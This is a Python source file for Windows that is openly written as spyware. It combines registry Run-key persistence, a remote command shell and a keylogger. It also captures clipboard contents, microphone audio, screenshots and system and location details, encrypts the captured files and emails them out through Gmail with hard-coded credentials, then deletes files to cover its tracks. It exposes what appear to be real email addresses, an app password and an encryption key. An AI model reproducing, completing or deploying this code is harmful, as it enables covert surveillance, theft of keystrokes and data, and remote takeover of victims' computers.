import json
import os
import platform
import socket
import subprocess
import urllib.request
import uuid
import platform
import winreg

#################################################################33ADDED PART ############
from PIL import ImageGrab
import os
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
# EMAIL IMPORTS BELOW

import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

# EMAIL IMPORTS

############################KEY LOGGER BELOW



keys_information = 'log.txt'
system_information = "sys.txt"
clipboard_information = "clipboard_pro.txt"
audio_information = "audio_pro.wav"
screenshot_information = "screenshot_pro.png"

keys_information_e = "e_log.txt"
system_information_e = "e_sys.txt"
clipboard_information_e = "e_clipboard.txt"
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
key = "lr-P4dNajeFXLopKXhy2nhXyHRLIsyyWu9-4IEZJcBE="
username = getpass.getuser()

file_path = "C:\\Users\\Raymond\\PycharmProjects\\keylog"
extend = "\\"
file_merge = file_path + extend

smtp_port = 587
smtp_server = "smtp.gmail.com"

email_from = 'razyimond@gmail.com'
email_list = ['razyimond@gmail.com', 'mbithiraymond@gmail.com']
pswd = 'mpqggrfvtmpkfskv'



subject = "We got some details"


class Persistence:
    def __init__(self):
        self.check_reg()

    def add_reg(self):
        try:
            addr = r'c:/desktop/reverse.exe'
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'reverse', 0, winreg.REG_SZ, addr)
            winreg.CloseKey(key)
        except:
            pass

    def check_reg(self):
        try:
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,winreg.KEY_READ)
            index = 0
            while True:
                v = winreg.EnumValue(key, index)
                if 'reverse' not in v:
                    index += 1
                    continue
                return True



        except:
            winreg.CloseKey(key)
            self.add_reg()


class CommonData:
    def __init__(self):
        pass

    @property
    def mac(self):
        try:
            mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
            return mac
        except:
            return 'null'


    @property
    def hostname(self):
        try:
            hostname = socket.getfqdn(socket.gethostname()).strip()
            return hostname
        except:
            return 'null'

    @property
    def public_ip(self):
        try:
            return urllib.request.urlopen('https://api.ipyfy.org/').read().decode('utf8')
        except:
            return 'null'

    @property
    def location(self):
        try:
            data = urllib.request.urlopen('https://freegeoip.app/json/').read().decode('utf8')
            json_data = json.loads(data)
            country_name = json_data['country_name']
            city = json_data['city']
            return '%s:%s' % (country_name, city)

        except:
            return 'null'
    @property
    def machine(self):
        try:
            return platform.system()

        except:
            return 'null'

    @property
    def core(self):
        try:
            platform.machine()
        except:
            return 'null'

class reverseshell:
    HOST = 'localhost' # add my public ip add
    PORT = 5000
    BUFF_SIZE = 2048

    def __init__(self):
        #we allow for persistence
        p = Persistence()
        p.add_reg()
        p.check_reg()
        # create a tcp socket
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        # bind the socket to the address
        self.s.bind((self.HOST, self.PORT))
        # listen for connections
        self.s.listen()
        print(f'[*] Listening on {self.HOST, self.PORT}')
        self.client_socket, self.client_address = self.s.accept()
        print(f'[+] Accepted conn: {self.client_address[0]:{self.client_address[1]}}')
        self.main()
        self.socket_init()

    def socket_init(self):
        self.client_socket, self.client_address = self.s.accept()
        print(f'[+] Accepted conn: {self.client_address[0]:{self.client_address[1]}}')
        self.main()

    def send_msg(self, msg):
        # convert string msg into utf bytes#the below texts appear on the ncat
        msg = bytes(f'{msg}\n\n:> ', 'utf8')
        send = self.client_socket.sendall(msg)
        # returns none if sendall is successfully
        return send

    def recv_msg(self):
        recv = self.client_socket.recv(self.BUFF_SIZE)
        # return value is a byte, object represents in data received
        return recv

    def main(self):
        # send conn msg to conn client
        if self.send_msg('[revShell] You have connected') != None:
            print('[*] Error has occurred')

        #main part of the prog
        while True:
            try:

                #this below should be sending and receiving msgs on ncat
                msg = ''
                chunk = self.recv_msg()
                msg += chunk.strip().decode('utf8')
                #hq 4 commands functions and so on using the received msg
                self.hq(msg)
            except:
                #close the client socket
                self.client_socket.close()
                #go to init and search for another connection
                self.socket_init()

    def hq(self, msg):
        try:
            if msg[:5] == 'data. ':
                data = CommonData()
                if msg[:10] == 'data.mac':
                    self.send_msg(data.mac)
                elif msg[:13] == 'data.hostname':
                    self.send_msg(data.hostname)
                elif msg[:7] == 'data.ip':
                    self.send_msg(data.public_ip)
                elif msg[:13] == 'data.location':
                    self.send_msg(data.location)

                elif msg[:12] == 'data.machine':
                    self.send_msg(data.machine)
                elif msg[:9] == 'data.core':
                    self.send_msg(data.core)
                    # we can set up an attack on the microphone with an elif statement like below keylogger here
                # elif msg[:10] == "attack":
                #     attack = AttackCommands()

            else:
                # normal command prompt using the shell
                # we are going to use the shell as if we are in their comp
                tsk = subprocess.Popen(args=msg, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT)
                stdout, stderr = tsk.communicate()
                # the result from subprocess shell stdout decoded in utf8
                myresult = stdout.decode('utf8')
                if msg[:2] == 'cd':
                    os.chdir(msg[3:])
                    self.send_msg('[revShell] *changed directory*')
                elif msg[:4] == 'exit':
                    # close client socket
                    self.client_socket.close()
                    # go to socket init method and listen for connections
                    # we are at min 44:38
                    self.socket_init()

                else:
                    # send the result to the client
                    self.send_msg(f'{myresult}')

        except Exception as e:
            print(e)
            self.send_msg(f'[revShell] {e}')

if __name__ == '__main__':
    p = Persistence()

    malware = reverseshell()


    def sendText_emails(email_list, filename):
        for person in email_list:
            # the body of the email

            body = f"""
            line 1
            line 2
            line 3
            etc

                """

            # make a MIME object to define parts of the email

            msg = MIMEMultipart()
            msg['From'] = email_from
            msg['To'] = person
            msg['Subject'] = subject

            # attach the body of the message
            msg.attach(MIMEText(body, 'plain'))

            # we are attaching the csv file

            # open the file in python as binary
            attachment = open(filename, 'rb')  # we are reading in binary dummy

            # encode base 64
            attachment_package = MIMEBase('application', 'octet-stream')
            attachment_package.set_payload((attachment).read())
            encoders.encode_base64(attachment_package)
            attachment_package.add_header('Content-Disposition', "attachment; filename=" + filename)
            msg.attach(attachment_package)

            # cast it to a string
            text = msg.as_string()

            # Connect with the server
            print("Connexting to server...")
            TIE_server = smtplib.SMTP(smtp_server, smtp_port)
            TIE_server.starttls()
            TIE_server.login(email_from, pswd)
            print("Successfully conned to server")
            print()

            # send emails to "persons" as listed
            print(f"Sending email to {person}...")
            TIE_server.sendmail(email_from, person, text)
            print((f"Email sent to:{person}"))

        TIE_server.quit()


    # sendText_emails(email_list,keys_information)

    def computer_information():
        with open(file_path + extend + system_information, 'a') as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP ADD: " + public_ip)
            except Exception:
                f.write("Could not get Public Ip add (might be max query)")

            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("System:" + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP ADD: " + IPAddr + "\n")


    # computer_information()

    def copy_clipboard():
        with open(file_path + extend + clipboard_information, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                f.write("Clipboard Data: \n" + pasted_data)


            except:
                f.write("Clipboard could not be copied")


    copy_clipboard()


    # getting the audio

    def microphone():
        fs = 44100
        # the amount of time we aregoing to get on the microphone
        seconds = microphone_time

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()

        write(file_path + extend + audio_information, fs, myrecording)


    # it is going to record for 10 secs
    # microphone()

    def screenshot():
        im = ImageGrab.grab()
        im.save(file_path + extend + screenshot_information)


    # the execution of the screenshot
    # screenshot()

    # keylogger below #keylogger below
    number_of_iterations = 0
    # GETTING THE TIME THE KEY LOGGER IS LAUNCHED
    currentTime = time.time()
    stoppingTime = time.time() + time_iteration

    while number_of_iterations < number_of_iterations_end:
        count = 0
        keys = []


        def on_press(key):
            global keys, count, currentTime

            print(key)
            keys.append(key)
            # we are going to increase the key count by 1
            count += 1
            currentTime = time.time()

            if count >= 1:
                count = 0
                write_file(keys)
                keys = []


        def write_file(keys):
            # we are going to be appending the press.txt file
            with open(file_path + extend + keys_information, "a") as f:
                for key in keys:
                    # we are removing the '' when the keys are taken in
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write('\n')
                        f.close()
                    elif k.find("Key") == -1:
                        f.write(k)
                        f.close()


        def on_release(key):
            if key == Key.esc:
                return False
            # below we are stopping the keylogger
            if currentTime > stoppingTime:
                return False


        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        if currentTime > stoppingTime:
            # clear out the entire logs for the keys info
            with open(file_path + extend + keys_information, 'w') as f:
                f.write(" ")

            screenshot()
            # WE ARE GOING TO SEND THE SCREENSHOT INFO
            print('Screenshot file sent')
            sendText_emails(email_list, screenshot_information)

            file_enc = 'encryption_key.txt'
            sendText_emails(email_list, file_enc)
            print('The key has been sent')

            copy_clipboard()
            sendText_emails(email_list, clipboard_information)

            microphone()
            sendText_emails(email_list, audio_information)
            ###########################################################ADDED THE PART BELOW ##########################################

            with open(keys_information, 'rb') as keys:
                ficha = keys.read()

            f = Fernet(key)
            encryptical = f.encrypt(ficha)

            with open('enc.txt', 'wb') as enc:
                enc.write(encryptical)

            # WE ARE GOING TO SEND THE ENC FILE THAT GOT THE LOGS
            enc_file = 'enc.txt'
            sendText_emails(email_list, enc_file)
            print('The encrypted log file has been sent')

            number_of_iterations += 1

            currentTime = time.time()
            stoppingTime = time.time() + time_iteration

    files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information,
                        file_merge + keys_information]
    encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
                            file_merge + keys_information_e]

    count = 0

    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[count], 'wb') as f:
            f.write(encrypted)

        # WE HAVE BEEN ABLE TO SEND THE SPECIFIC FILES
        sendText_emails(email_list, encrypted_file_names[count])
        count += 1

    time.sleep(120)  # we will let it sleep for two mins

    # clean up tracks and delete files
    delete_files = [system_information, clipboard_information, screenshot_information, audio_information]
    for file in delete_files:
        os.remove(file_merge + file)
    ##################################################################ABOVE IS THE ADDED PART
#pip install sounddevice
#pip install scipy